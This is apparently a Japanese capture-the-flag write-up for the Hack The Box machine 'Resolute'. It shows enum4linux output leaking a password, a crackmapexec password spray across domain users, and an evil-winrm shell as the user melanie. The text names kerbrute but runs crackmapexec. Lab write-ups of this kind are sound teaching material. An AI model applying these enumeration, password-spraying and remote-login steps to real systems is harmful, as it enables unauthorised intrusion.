# Recon

`enum4linux`の結果をよくみると、ユーザmarkoのパスワードを発見：

```
┌──(shoebill㉿shoebill)-[~]
└─$  enum4linux -a -M -l -d 10.10.10.169
...
        User Name   :   marko
        Full Name   :   Marko Novak
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Account created. Password set to Welcome123!
        Workstations:
        Comment     :
...
```

# initial shell

残念ながらmarkoのシェルがとれなかったので、パスワードの使い回しを疑って次のように`kerbrute`を実行：

```
┌──(shoebill㉿shoebill)-[~/Resolute_10.10.10.169]
└─$ crackmapexec smb 10.10.10.169 -u users.txt -d megabank.local -p 'Welcome123!'
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
...
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
```

ユーザmelanieのパスワードもWelcome123!と判明。

次のようにしてmelanieのシェルをゲット：

```
┌──(shoebill㉿shoebill)-[~/Resolute_10.10.10.169]
└─$ evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'
...
*Evil-WinRM* PS C:\Users\melanie\Documents> whoami
megabank\melanie
```

